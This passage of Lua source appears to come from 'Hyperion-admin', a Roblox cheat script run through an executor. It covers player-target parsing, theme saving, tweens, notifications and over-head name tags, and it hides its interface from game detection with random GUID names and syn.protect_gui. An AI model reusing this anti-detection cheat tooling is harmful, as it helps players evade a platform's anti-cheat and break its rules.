	local PlayerArgs = {
		["all"] = function()
			return filter(CurrentPlayers, function(i, v) -- removed all arg (but not really) due to commands getting messed up and people getting confused
				return v ~= LocalPlayer
			end)
		end,
		["others"] = function()
			return filter(CurrentPlayers, function(i, v)
				return v ~= LocalPlayer
			end)
		end,
		["nearest"] = function()
			sort(Magnitudes, function(a, b)
				return a[2] < b[2]
			end)
			return {Magnitudes[2][1]}
		end,
		["farthest"] = function()
			sort(Magnitudes, function(a, b)
				return a[2] > b[2]
			end)
			return {Magnitudes[2][1]}
		end,
		["random"] = function()
			return {CurrentPlayers[random(2, #CurrentPlayers)]}
		end,
		["allies"] = function()
			local LTeam = LocalPlayer.Team
			return filter(CurrentPlayers, function(i, v)
				return v.Team == LTeam
			end)
		end,
		["enemies"] = function()
			local LTeam = LocalPlayer.Team
			return filter(CurrentPlayers, function(i, v)
				return v.Team ~= LTeam
			end)
		end,
		["npcs"] = function()
			local NPCs = {}
			local Descendants = GetDescendants(Workspace);
			local GetPlayerFromCharacter = Players.GetPlayerFromCharacter
			for i = 1, #Descendants do
				local Descendant = Descendants[i]
				local DParent = Descendant.Parent
				if (IsA(Descendant, "Humanoid") and IsA(DParent, "Model") and (FindFirstChild(DParent, "HumanoidRootPart") or FindFirstChild(DParent, "Head")) and GetPlayerFromCharacter(Players, DParent) == nil) then
					local FakePlr = InstanceNew("Player"); -- so it can be compatible with commands
					FakePlr.Character = DParent
					FakePlr.Name = format("%s %s", DParent.Name, "- " .. Descendant.DisplayName);
					NPCs[#NPCs + 1] = FakePlr
				end
			end
			return NPCs
		end,
		["me"] = function()
			return {LocalPlayer}
		end
	}

	if (PlayerArgs[str]) then
		return PlayerArgs[str]();
	end

	local Players = filter(CurrentPlayers, function(i, v)
		return (sub(lower(v.Name), 1, #str) == str) or (sub(lower(v.DisplayName), 1, #str) == str);
	end)
	if (not next(Players) and not noerror) then
		Utils.Notify(LocalPlayer, "Fail", format("Couldn't find player %s", str));
	end
	return Players
end

local AddConnection = function(Connection, CEnv, TblOnly)
	if (CEnv) then
		CEnv[#CEnv + 1] = Connection
		if (TblOnly) then
			return Connection
		end
	end
	Connections[#Connections + 1] = Connection
	return Connection
end

local LastCommand = {}

--IMPORT [ui]
Guis = {}
ParentGui = function(Gui, Parent)
	Gui.Name = sub(gsub(GenerateGUID(Services.HttpService, false), '-', ''), 1, random(25, 30))
	ProtectInstance(Gui);
	if (syn and syn.protect_gui) then syn.protect_gui(Gui); end -- for preload
	Gui.Parent = Parent or Services.CoreGui
	Guis[#Guis + 1] = Gui
	return Gui
end
UI = Clone(Services.InsertService:LoadLocalAsset("rbxassetid://7882275026"));
UI.Enabled = true

local CommandBarPrefix;

local ConfigUI = UI.Config
local ConfigElements = ConfigUI.GuiElements
local CommandBar = UI.CommandBar
local Commands = UI.Commands
local ChatLogs = UI.ChatLogs
local Console = UI.Console
local GlobalChatLogs = Clone(UI.ChatLogs);
local HttpLogs = Clone(UI.ChatLogs);
local Notification = UI.Notification
local Command = UI.Command
local ChatLogMessage = UI.Message
local GlobalChatLogMessage = Clone(UI.Message);
local NotificationBar = UI.NotificationBar

CommandBarOpen = false
CommandBarTransparencyClone = Clone(CommandBar);
ChatLogsTransparencyClone = Clone(ChatLogs);
ConsoleTransparencyClone = Clone(Console);
GlobalChatLogsTransparencyClone = Clone(GlobalChatLogs);
HttpLogsTransparencyClone = Clone(HttpLogs);
CommandsTransparencyClone = nil
ConfigUIClone = Clone(ConfigUI);
PredictionText = ""
do
	local UIParent = CommandBar.Parent
	GlobalChatLogs.Parent = UIParent
	GlobalChatLogMessage.Parent = UIParent
	GlobalChatLogs.Name = "GlobalChatLogs"
	GlobalChatLogMessage.Name = "GlobalChatLogMessage"

	HttpLogs.Parent = UIParent
	HttpLogs.Name = "HttpLogs"
	HttpLogs.Size = UDim2.new(0, 421, 0, 260);
	HttpLogs.Search.PlaceholderText = "Search"
end
-- position CommandBar
CommandBar.Position = UDim2.new(0.5, -100, 1, 5);

local UITheme, Values;
do
	local BaseBGColor = Color3.fromRGB(32, 33, 36);
	local BaseTransparency = 0.25
	local BaseTextColor = Color3.fromRGB(220, 224, 234);
	local BaseValues = { BackgroundColor = BaseBGColor, Transparency = BaseTransparency, TextColor = BaseTextColor }
	Values = { Background = clone(BaseValues), CommandBar = clone(BaseValues), CommandList = clone(BaseValues), Notification = clone(BaseValues), ChatLogs = clone(BaseValues), Config = clone(BaseValues) }
	local Objects = keys(Values);
	local GetBaseMT = function(Object)
		return setmetatable({}, {
			__newindex = function(self, Index, Value)
				local type = typeof(Value);
				if (Index == "BackgroundColor") then
					if (Value == "Reset") then
						Value = BaseBGColor
						type = "Color3"
					end
					assert(type == 'Color3', format("invalid argument #3 (Color3 expected, got %s)", type));
					if (Object == "Background") then
						CommandBar.BackgroundColor3 = Value
						Notification.BackgroundColor3 = Value
						Command.BackgroundColor3 = Value
						ChatLogs.BackgroundColor3 = Value
						ChatLogs.Frame.BackgroundColor3 = Value
						Console.BackgroundColor3 = Value
						Console.Frame.BackgroundColor3 = Value
						HttpLogs.BackgroundColor3 = Value
						HttpLogs.Frame.BackgroundColor3 = Value
						UI.ToolTip.BackgroundColor3 = Value
						ConfigUI.BackgroundColor3 = Value
						ConfigUI.Container.BackgroundColor3 = Value
						Commands.BackgroundColor3 = Value
						Commands.Frame.BackgroundColor3 = Value
						local Children = GetChildren(UI.NotificationBar);
						for i = 1, #Children do
							local Child = Children[i]
							if (IsA(Child, "GuiObject")) then
								Child.BackgroundColor3 = Value
							end
						end
						local Children = GetChildren(Commands.Frame.List);
						for i = 1, #Children do
							local Child = Children[i]
							if (IsA(Child, "GuiObject")) then
								Child.BackgroundColor3 = Value
							end
						end
						for i, v in next, Values do
							Values[i].BackgroundColor = Value
						end
					elseif (Object == "CommandBar") then
						CommandBar.BackgroundColor3 = Value
					elseif (Object == "Notification") then
						Notification.BackgroundColor3 = Value
						local Children = GetChildren(UI.NotificationBar);
						for i = 1, #Children do
							local Child = Children[i]
							if (IsA(Child, "GuiObject")) then
								Child.BackgroundColor3 = Value
							end
						end
					elseif (Object == "CommandList") then
						Commands.BackgroundColor3 = Value
						Commands.Frame.BackgroundColor3 = Value
					elseif (Object == "Command") then
						Command.BackgroundColor3 = Value
					elseif (Object == "ChatLogs") then
						ChatLogs.BackgroundColor3 = Value
						ChatLogs.Frame.BackgroundColor3 = Value
						HttpLogs.BackgroundColor3 = Value
						HttpLogs.Frame.BackgroundColor3 = Value
					elseif (Object == "Console") then
						Console.BackgroundColor3 = Value
						Console.Frame.BackgroundColor3 = Value
					elseif (Object == "Config") then
						ConfigUI.BackgroundColor3 = Value
						ConfigUI.Container.BackgroundColor3 = Value
					end
					Values[Object][Index] = Value
				elseif (Index == "TextColor") then
					if (Value == "Reset") then
						Value = BaseTextColor
						type = "Color3"
					end
					assert(type == 'Color3', format("invalid argument #3 (Color3 expected, got %s)", type));
					if (Object == "Notification") then
						Notification.Title.TextColor3 = Value
						Notification.Message.TextColor3 = Value
						Notification.Close.TextColor3 = Value
					elseif (Object == "CommandBar") then
						CommandBar.Input.TextColor3 = Value
						CommandBar.Arrow.TextColor3 = Value
					elseif (Object == "CommandList") then
						Command.CommandText.TextColor3 = Value
						local Descendants = GetDescendants(Commands);
						for i = 1, #Descendants do
							local Descendant = Descendants[i]
							local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
							if (IsText) then
								Descendant.TextColor3 = Value
							end
						end
					elseif (Object == "ChatLogs") then
						UI.Message.TextColor3 = Value
					elseif (Object == "Config") then
						local Descendants = GetDescendants(ConfigUI);
						for i = 1, #Descendants do
							local Descendant = Descendants[i]
							local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
							if (IsText) then
								Descendant.TextColor3 = Value
							end
						end
					elseif (Object == "Background") then
						Notification.Title.TextColor3 = Value
						Notification.Message.TextColor3 = Value
						Notification.Close.TextColor3 = Value
						CommandBar.Input.TextColor3 = Value
						CommandBar.Arrow.TextColor3 = Value
						Command.CommandText.TextColor3 = Value
						UI.Message.TextColor3 = Value
						local Descendants = GetDescendants(ConfigUI);
						for i = 1, #Descendants do
							local Descendant = Descendants[i]
							local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
							if (IsText) then
								Descendant.TextColor3 = Value
							end
						end
						local Descendants = GetDescendants(Commands);
						for i = 1, #Descendants do
							local Descendant = Descendants[i]
							local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
							if (IsText) then
								Descendant.TextColor3 = Value
							end
						end
						for i, v in next, Values do
							Values[i].TextColor = Value
						end
					end
					Values[Object][Index] = Value
				elseif (Index == "Transparency") then
					if (Value == "Reset") then
						Value = BaseTransparency
						type = "number"
					end
					assert(type == 'number', format("invalid argument #3 (Color3 expected, got %s)", type));
					if (Object == "Background") then
						CommandBar.Transparency = Value
						Notification.Transparency = Value
						Command.Transparency = Value + .5
						ChatLogs.Transparency = Value
						ChatLogs.Frame.Transparency = Value
						HttpLogs.Transparency = Value
						HttpLogs.Frame.Transparency = Value
						UI.ToolTip.Transparency = Value
						ConfigUI.Transparency = Value
						ConfigUI.Container.Transparency = Value + .5
						Commands.Transparency = Value
						Commands.Frame.Transparency = Value + .5
						Values[Object][Index] = Value
					elseif (Object == "Notification") then
						Notification.Transparency = Value
						local Children = GetChildren(UI.NotificationBar);
						for i = 1, #Children do
							local Child = Children[i]
							if (IsA(Child, "GuiObject")) then
								Child.Transparency = Value
							end
						end
					end
					Values[Object][Index] = Value
				end
			end,
			__index = function(self, Index)
				return Values[Object][Index]
			end
		})
	end
	UITheme = setmetatable({}, {
		__index = function(self, Index)
			if (Tfind(Objects, Index)) then
				local BaseMt = GetBaseMT(Index);
				self[Index] = BaseMt
				return BaseMt
			end
		end
	})
end

local IsSupportedExploit = isfile and isfolder and writefile and readfile

local GetThemeConfig
local WriteThemeConfig = function(Conf)
	if (IsSupportedExploit and isfolder("Hyperion-admin")) then
		local ToHSV = Color3.new().ToHSV
		local ValuesToEncode = deepsearchset(Values, function(i, v)
			return typeof(v) == 'Color3'
		end, function(i, v)
			local H, S, V = ToHSV(v);
			return {H, S, V, "Color3"}
		end)
		local Data = JSONEncode(Services.HttpService, ValuesToEncode);
		writefile("Hyperion-admin/Theme.json", Data);
	end
end

GetThemeConfig = function()
	if (IsSupportedExploit and isfolder("Hyperion-admin")) then
		if (isfile("Hyperion-admin/Theme.json")) then
			local Success, Data = pcall(JSONDecode, Services.HttpService, readfile("Hyperion-admin/Theme.json"));
			if (not Success or type(Data) ~= 'table') then
				WriteThemeConfig();
				return Values
			end
			local DecodedData = deepsearchset(Data, function(i, v)
				return type(v) == 'table' and #v == 4 and v[4] == "Color3"
			end, function(i,v)
				return Color3.fromHSV(v[1], v[2], v[3]);
			end)
			return DecodedData            
		else
			WriteThemeConfig();
			return Values
		end
	else
		return Values
	end
end

local LoadTheme;
do
	local Config = GetConfig();
	CommandBarPrefix = isfolder and (Config.CommandBarPrefix and Enum.KeyCode[Config.CommandBarPrefix] or Enum.KeyCode.Semicolon) or Enum.KeyCode.Semicolon

	local Theme = GetThemeConfig();
	LoadTheme = function(Theme)
		UITheme.Background.BackgroundColor = Theme.Background.BackgroundColor
		UITheme.Background.Transparency = Theme.Background.Transparency

		UITheme.ChatLogs.BackgroundColor = Theme.ChatLogs.BackgroundColor
		UITheme.CommandBar.BackgroundColor = Theme.CommandBar.BackgroundColor
		UITheme.Config.BackgroundColor = Theme.Config.BackgroundColor
		UITheme.Notification.BackgroundColor = Theme.Notification.BackgroundColor
		UITheme.CommandList.BackgroundColor = Theme.Notification.BackgroundColor

		UITheme.ChatLogs.TextColor = Theme.ChatLogs.TextColor
		UITheme.CommandBar.TextColor = Theme.CommandBar.TextColor
		UITheme.Config.TextColor = Theme.Config.TextColor
		UITheme.Notification.TextColor = Theme.Notification.TextColor
		UITheme.CommandList.TextColor = Theme.Notification.TextColor

		UITheme.ChatLogs.Transparency = Theme.ChatLogs.Transparency
		UITheme.CommandBar.Transparency = Theme.CommandBar.Transparency
		UITheme.Config.Transparency = Theme.Config.Transparency
		UITheme.Notification.Transparency = Theme.Notification.Transparency
		UITheme.CommandList.Transparency = Theme.Notification.Transparency
	end
	LoadTheme(Theme);
end
--END IMPORT [ui]



--IMPORT [utils]
Utils.Tween = function(Object, Style, Direction, Time, Goal)
	local TweenService = Services.TweenService
	local TInfo = TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction])
	local Tween = TweenService.Create(TweenService, Object, TInfo, Goal)

	Tween.Play(Tween)

	return Tween
end

Utils.MultColor3 = function(Color, Delta)
	local clamp = math.clamp
	return Color3.new(clamp(Color.R * Delta, 0, 1), clamp(Color.G * Delta, 0, 1), clamp(Color.B * Delta, 0, 1));
end

Utils.Click = function(Object, Goal) -- Utils.Click(Object, "BackgroundColor3")
	local Hover = {
		[Goal] = Utils.MultColor3(Object[Goal], 0.9)
	}

	local Press = {
		[Goal] = Utils.MultColor3(Object[Goal], 1.2)
	}

	local Origin = {
		[Goal] = Object[Goal]
	}

	AddConnection(CConnect(Object.MouseEnter, function()
		Utils.Tween(Object, "Sine", "Out", .5, Hover);
	end));

	AddConnection(CConnect(Object.MouseLeave, function()
		Utils.Tween(Object, "Sine", "Out", .5, Origin);
	end));

	AddConnection(CConnect(Object.MouseButton1Down, function()
		Utils.Tween(Object, "Sine", "Out", .3, Press);
	end));

	AddConnection(CConnect(Object.MouseButton1Up, function()
		Utils.Tween(Object, "Sine", "Out", .4, Hover);
	end));
end

Utils.Blink = function(Object, Goal, Color1, Color2) -- Utils.Click(Object, "BackgroundColor3", NormalColor, OtherColor)
	local Normal = {
		[Goal] = Color1
	}

	local Blink = {
		[Goal] = Color2
	}

	local Tween = Utils.Tween(Object, "Sine", "Out", .5, Blink)
	CWait(Tween.Completed);

	Tween = Utils.Tween(Object, "Sine", "Out", .5, Normal)
	CWait(Tween.Completed);
end

Utils.Hover = function(Object, Goal)
	local Hover = {
		[Goal] = Utils.MultColor3(Object[Goal], 0.9)
	}

	local Origin = {
		[Goal] = Object[Goal]
	}

	AddConnection(CConnect(Object.MouseEnter, function()
		Utils.Tween(Object, "Sine", "Out", .5, Hover);
	end));

	AddConnection(CConnect(Object.MouseLeave, function()
		Utils.Tween(Object, "Sine", "Out", .5, Origin);
	end));
end

Utils.Draggable = function(Ui, DragUi)
	local DragSpeed = 0
	local StartPos
	local DragToggle, DragInput, DragStart, DragPos

	DragUi = Dragui or Ui
	local TweenService = Services.TweenService

	local function UpdateInput(Input)
		local Delta = Input.Position - DragStart
		local Position = UDim2.new(StartPos.X.Scale, StartPos.X.Offset + Delta.X, StartPos.Y.Scale, StartPos.Y.Offset + Delta.Y)

		Utils.Tween(Ui, "Linear", "Out", .25, {
			Position = Position
		});
		local Tween = TweenService.Create(TweenService, Ui, TweenInfo.new(0.25), {Position = Position});
		Tween.Play(Tween);
	end

	AddConnection(CConnect(Ui.InputBegan, function(Input)
		if ((Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch) and Services.UserInputService.GetFocusedTextBox(Services.UserInputService) == nil) then
			DragToggle = true
			DragStart = Input.Position
			StartPos = Ui.Position

			AddConnection(CConnect(Input.Changed, function()
				if (Input.UserInputState == Enum.UserInputState.End) then
					DragToggle = false
				end
			end));
		end
	end));

	AddConnection(CConnect(Ui.InputChanged, function(Input)
		if (Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch) then
			DragInput = Input
		end
	end));

	AddConnection(CConnect(Services.UserInputService.InputChanged, function(Input)
		if (Input == DragInput and DragToggle) then
			UpdateInput(Input)
		end
	end));
end

Utils.SmoothScroll = function(content, SmoothingFactor) -- by Elttob
	-- get the 'content' scrolling frame, aka the scrolling frame with all the content inside
	-- if smoothing is enabled, disable scrolling
	content.ScrollingEnabled = false

	-- create the 'input' scrolling frame, aka the scrolling frame which receives user input
	-- if smoothing is enabled, enable scrolling
	local input = Clone(content)

	input.ClearAllChildren(input);
	input.BackgroundTransparency = 1
	input.ScrollBarImageTransparency = 1
	input.ZIndex = content.ZIndex + 1
	input.Name = "_smoothinputframe"
	input.ScrollingEnabled = true
	input.Parent = content.Parent

	-- keep input frame in sync with content frame
	local function syncProperty(prop)
		AddConnection(CConnect(GetPropertyChangedSignal(content, prop), function()
			if prop == "ZIndex" then
				-- keep the input frame on top!
				input[prop] = content[prop] + 1
			else
				input[prop] = content[prop]
			end
		end));
	end

	syncProperty "CanvasSize"
	syncProperty "Position"
	syncProperty "Rotation"
	syncProperty "ScrollingDirection"
	syncProperty "ScrollBarThickness"
	syncProperty "BorderSizePixel"
	syncProperty "ElasticBehavior"
	syncProperty "SizeConstraint"
	syncProperty "ZIndex"
	syncProperty "BorderColor3"
	syncProperty "Size"
	syncProperty "AnchorPoint"
	syncProperty "Visible"

	-- create a render stepped connection to interpolate the content frame position to the input frame position
	local smoothConnection = AddConnection(CConnect(RenderStepped, function()
		local a = content.CanvasPosition
		local b = input.CanvasPosition
		local c = SmoothingFactor
		local d = (b - a) * c + a

		content.CanvasPosition = d
	end));

	AddConnection(CConnect(content.AncestryChanged, function()
		if content.Parent == nil then
			Destroy(input);
			Disconnect(smoothConnection);
		end
	end));
end

Utils.TweenAllTransToObject = function(Object, Time, BeforeObject) -- max transparency is max object transparency, swutched args bc easier command
	local Descendants = GetDescendants(Object);
	local OldDescentants = GetDescendants(BeforeObject);
	local Tween -- to use to wait

	Tween = Utils.Tween(Object, "Sine", "Out", Time, {
		BackgroundTransparency = BeforeObject.BackgroundTransparency
	})

	for i = 1, #Descendants do
		local v = Descendants[i]
		local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
		local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
		local IsScrollingFrame = IsA(v, "ScrollingFrame")

		if (IsA(v, "GuiObject")) then
			if (IsText) then
				Utils.Tween(v, "Sine", "Out", Time, {
					TextTransparency = OldDescentants[i].TextTransparency,
					TextStrokeTransparency = OldDescentants[i].TextStrokeTransparency,
					BackgroundTransparency = OldDescentants[i].BackgroundTransparency
				})
			elseif (IsImage) then
				Utils.Tween(v, "Sine", "Out", Time, {
					ImageTransparency = OldDescentants[i].ImageTransparency,
					BackgroundTransparency = OldDescentants[i].BackgroundTransparency
				})
			elseif (IsScrollingFrame) then
				Utils.Tween(v, "Sine", "Out", Time, {
					ScrollBarImageTransparency = OldDescentants[i].ScrollBarImageTransparency,
					BackgroundTransparency = OldDescentants[i].BackgroundTransparency
				})
			else
				Utils.Tween(v, "Sine", "Out", Time, {
					BackgroundTransparency = OldDescentants[i].BackgroundTransparency
				})
			end
		end
	end

	return Tween
end

Utils.SetAllTrans = function(Object)
	Object.BackgroundTransparency = 1

	local Descendants = GetDescendants(Object);
	for i = 1, #Descendants do
		local v = Descendants[i]
		local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
		local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
		local IsScrollingFrame = IsA(v, "ScrollingFrame")

		if (IsA(v, "GuiObject")) then
			v.BackgroundTransparency = 1

			if (IsText) then
				v.TextTransparency = 1
			elseif (IsImage) then
				v.ImageTransparency = 1
			elseif (IsScrollingFrame) then
				v.ScrollBarImageTransparency = 1
			end
		end
	end
end

Utils.TweenAllTrans = function(Object, Time)
	local Tween -- to use to wait

	Tween = Utils.Tween(Object, "Sine", "Out", Time, {
		BackgroundTransparency = 1
	})

	local Descendants = GetDescendants(Object);
	for i = 1, #Descendants do
		local v = Descendants[i]
		local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
		local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
		local IsScrollingFrame = IsA(v, "ScrollingFrame")

		if (IsA(v, "GuiObject")) then
			if (IsText) then
				Utils.Tween(v, "Sine", "Out", Time, {
					TextTransparency = 1,
					BackgroundTransparency = 1
				})
			elseif (IsImage) then
				Utils.Tween(v, "Sine", "Out", Time, {
					ImageTransparency = 1,
					BackgroundTransparency = 1
				})
			elseif (IsScrollingFrame) then
				Utils.Tween(v, "Sine", "Out", Time, {
					ScrollBarImageTransparency = 1,
					BackgroundTransparency = 1
				})
			else
				Utils.Tween(v, "Sine", "Out", Time, {
					BackgroundTransparency = 1
				})
			end
		end
	end

	return Tween
end

Utils.TextSize = function(Object)
	local TextService = Services.TextService
	return TextService.GetTextSize(TextService, Object.Text, Object.TextSize, Object.Font, Vector2.new(Object.AbsoluteSize.X, 1000)).Y
end

Utils.Notify = function(Caller, Title, Message, Time)
	if (not Caller or Caller == LocalPlayer) then
		local Notification = UI.Notification
		local NotificationBar = UI.NotificationBar

		local Clone = Clone(Notification)

		local function TweenDestroy()
			if (Utils and Clone) then
				local Tween = Utils.TweenAllTrans(Clone, .25)

				CWait(Tween.Completed)
				Destroy(Clone);
			end
		end

		Clone.Message.Text = Message
		Clone.Title.Text = Title or "Notification"
		Utils.SetAllTrans(Clone)
		Utils.Click(Clone.Close, "TextColor3")
		Clone.Visible = true
		Clone.Size = UDim2.fromOffset(Clone.Size.X.Offset, Utils.TextSize(Clone.Message) + Clone.Size.Y.Offset - Clone.Message.TextSize);
		Clone.Parent = NotificationBar

		coroutine.wrap(function()
			local Tween = Utils.TweenAllTransToObject(Clone, .5, Notification)

			CWait(Tween.Completed);
			wait(Time or 5);

			if (Clone) then
				TweenDestroy();
			end
		end)()

		AddConnection(CConnect(Clone.Close.MouseButton1Click, TweenDestroy));
		if (Title ~= "Warning" and Title ~= "Error") then
			Utils.Print(format("%s - %s", Title, Message), Caller, true);
		end

		return Clone
	else
		local ChatRemote = Services.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
		ChatRemote.FireServer(ChatRemote, format("/w %s [FA] %s: %s", Caller.Name, Title, Message), "All");
	end
end

Utils.MatchSearch = function(String1, String2)
	return String1 == sub(String2, 1, #String1);
end

Utils.StringFind = function(Table, String)
	for _, v in ipairs(Table) do
		if (Utils.MatchSearch(String, v)) then
			return v
		end
	end
end

Utils.GetPlayerArgs = function(Arg)
	Arg = lower(Arg);
	local SpecialCases = {"all", "others", "random", "me", "nearest", "farthest", "npcs", "allies", "enemies"}
	if (Utils.StringFind(SpecialCases, Arg)) then
		return Utils.StringFind(SpecialCases, Arg);
	end

	local CurrentPlayers = GetPlayers(Players);
	for i, v in next, CurrentPlayers do
		local Name, DisplayName = v.Name, v.DisplayName
		if (Name ~= DisplayName and Utils.MatchSearch(Arg, lower(DisplayName))) then
			return lower(DisplayName);
		end
		if (Utils.MatchSearch(Arg, lower(Name))) then
			return lower(Name);
		end
	end
end

Utils.ToolTip = function(Object, Message)
	local CloneToolTip
	local TextService = Services.TextService

	AddConnection(CConnect(Object.MouseEnter, function()
		if (Object.BackgroundTransparency < 1 and not CloneToolTip) then
			local TextSize = TextService.GetTextSize(TextService, Message, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24

			CloneToolTip = Clone(UI.ToolTip)
			CloneToolTip.Text = Message
			CloneToolTip.TextScaled = TextSize
			CloneToolTip.Visible = true
			CloneToolTip.Parent = UI
		end
	end))

	AddConnection(CConnect(Object.MouseLeave, function()
		if (CloneToolTip) then
			Destroy(CloneToolTip);
			CloneToolTip = nil
		end
	end))

	if (LocalPlayer) then
		AddConnection(CConnect(Mouse.Move, function()
			if (CloneToolTip) then
				CloneToolTip.Position = UDim2.fromOffset(Mouse.X + 10, Mouse.Y + 10)
			end
		end))
	else
		delay(3, function()
			LocalPlayer = Players.LocalPlayer
			AddConnection(CConnect(Mouse.Move, function()
				if (CloneToolTip) then
					CloneToolTip.Position = UDim2.fromOffset(Mouse.X + 10, Mouse.Y + 10)
				end
			end))
		end)
	end
end

Utils.ClearAllObjects = function(Object)
	local Children = GetChildren(Object);
	for i = 1, #Children do
		local Child = Children[i]
		if (IsA(Child, "GuiObject")) then
			Destroy(Child);
		end
	end
end

Utils.Rainbow = function(TextObject)
	local Text = TextObject.Text
	local Frequency = 1 -- determines how quickly it repeats
	local TotalCharacters = 0
	local Strings = {}

	TextObject.RichText = true

	for Character in gmatch(Text, ".") do
		if match(Character, "%s") then
			Strings[#Strings + 1] = Character
		else
			TotalCharacters = TotalCharacters + 1
			Strings[#Strings + 1] = {'<font color="rgb(%i, %i, %i)">' .. Character .. '</font>'}
		end
	end

	local Connection = AddConnection(CConnect(Heartbeat, function()
		local String = ""
		local Counter = TotalCharacters

		for _, CharacterTable in ipairs(Strings) do
			local Concat = ""

			if (type(CharacterTable) == "table") then
				Counter = Counter - 1
				local Color = Color3.fromHSV(-atan(math.tan((tick() + Counter/math.pi)/Frequency))/math.pi + 0.5, 1, 1)

				CharacterTable = format(CharacterTable[1], floor(Color.R * 255), floor(Color.G * 255), floor(Color.B * 255))
			end

			String = String .. CharacterTable
		end

		TextObject.Text = String .. " "
	end));
	delay(150, function()
		Disconnect(Connection);
	end)

end

Utils.Vector3toVector2 = function(Vector)
	local Tuple = WorldToViewportPoint(Camera, Vector);
	return Vector2New(Tuple.X, Tuple.Y);
end

Utils.AddTag = function(Tag)
	if (not Tag) then
		return
	end
	local PlrCharacter = GetCharacter(Tag.Player)
	if (not PlrCharacter) then
		return
	end
	local Billboard = InstanceNew("BillboardGui");
	Billboard.Parent = UI
	Billboard.Name = GenerateGUID(Services.HttpService);
	Billboard.AlwaysOnTop = true
	Billboard.Adornee = FindFirstChild(PlrCharacter, "Head") or nil
	Billboard.Enabled = FindFirstChild(PlrCharacter, "Head") and true or false
	Billboard.Size = UDim2.new(0, 200, 0, 50)
	Billboard.StudsOffset = Vector3New(0, 4, 0);

	local TextLabel = InstanceNew("TextLabel", Billboard);
	TextLabel.Name = GenerateGUID(Services.HttpService);
	TextLabel.TextStrokeTransparency = 0.6
	TextLabel.BackgroundTransparency = 1
	TextLabel.TextColor3 = Color3.new(0, 255, 0);
	TextLabel.Size = UDim2.new(0, 200, 0, 50);
	TextLabel.TextScaled = false
	TextLabel.TextSize = 15
	TextLabel.Text = format("%s (%s)", Tag.Name, Tag.Tag);

	if (Tag.Rainbow) then
		Utils.Rainbow(TextLabel)
	end
	if (Tag.Colour) then
		local TColour = Tag.Colour
		TextLabel.TextColor3 = Color3.fromRGB(TColour[1], TColour[2], TColour[3]);
	end

	local Added = AddConnection(CConnect(Tag.Player.CharacterAdded, function()
		Billboard.Adornee = WaitForChild(Tag.Player.Character, "Head");
	end));

	AddConnection(CConnect(Players.PlayerRemoving, function(plr)
		if (plr == Tag.Player) then
			Disconnect(Added);
			Destroy(Billboard);
		end
	end))
end

Utils.TextFont = function(Text, RGB)
	RGB = concat(RGB, ",")
	local New = {}
	gsub(Text, ".", function(x)
		New[#New + 1] = x
	end)
	return concat(map(New, function(i, letter)
		return format('<font color="rgb(%s)">%s</font>', RGB, letter)
	end)) .. " "
end

Utils.Thing = function(Object)
	local Container = InstanceNew("Frame");
	local Hitbox = InstanceNew("ImageButton");
	local UDim2fromOffset = UDim2.fromOffset

	Container.Name = "Container"
	Container.Parent = Object.Parent
	Container.BackgroundTransparency = 1.000
	Container.BorderSizePixel = 0
	Container.Position = Object.Position
	Container.ClipsDescendants = true
	Container.Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y);
	Container.ZIndex = Object

	Object.AutomaticSize = Enum.AutomaticSize.X
	Object.Size = UDim2.fromScale(1, 1)
	Object.Position = UDim2.fromScale(0, 0)
	Object.Parent = Container
	Object.TextTruncate = Enum.TextTruncate.None
	Object.ZIndex = Object.ZIndex + 2

	Hitbox.Name = "Hitbox"
	Hitbox.Parent = Container.Parent
	Hitbox.BackgroundTransparency = 1.000
	Hitbox.Size = Container.Size
	Hitbox.Position = Container.Position
	Hitbox.ZIndex = Object.ZIndex + 2

	local MouseOut = true

	AddConnection(CConnect(Hitbox.MouseEnter, function()
		if Object.AbsoluteSize.X > Container.AbsoluteSize.X then
			MouseOut = false
			repeat
				local Tween1 = Utils.Tween(Object, "Quad", "Out", .5, {
					Position = UDim2fromOffset(Container.AbsoluteSize.X - Object.AbsoluteSize.X, 0);
				})
				CWait(Tween1.Completed);
				wait(.5);
				local Tween2 = Utils.Tween(Object, "Quad", "Out", .5, {
					Position = UDim2fromOffset(0, 0);
				})
				CWait(Tween2.Completed);
				wait(.5);
			until MouseOut
		end
	end))

	AddConnection(CConnect(Hitbox.MouseLeave, function()
		MouseOut = true
		Utils.Tween(Object, "Quad", "Out", .25, {
			Position = UDim2fromOffset(0, 0);
		});
	end))

	return Object
end

function Utils.Intro(Object)
	local Frame = InstanceNew("Frame");
	local UICorner = InstanceNew("UICorner");
	local CornerRadius = FindFirstChild(Object, "UICorner") and Object.UICorner.CornerRadius or UDim.new(0, 0)
	local UDim2fromOffset  = UDim2.fromOffset

	Frame.Name = "IntroFrame"
	Frame.ZIndex = 1000
	Frame.Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y)
	Frame.AnchorPoint = Vector2.new(.5, .5)
	Frame.Position = UDim2.new(Object.Position.X.Scale, Object.Position.X.Offset + (Object.AbsoluteSize.X / 2), Object.Position.Y.Scale, Object.Position.Y.Offset + (Object.AbsoluteSize.Y / 2))
	Frame.BackgroundColor3 = Object.BackgroundColor3
	Frame.BorderSizePixel = 0

	UICorner.CornerRadius = CornerRadius
	UICorner.Parent = Frame

	Frame.Parent = Object.Parent

	if (Object.Visible) then
		Frame.BackgroundTransparency = 1

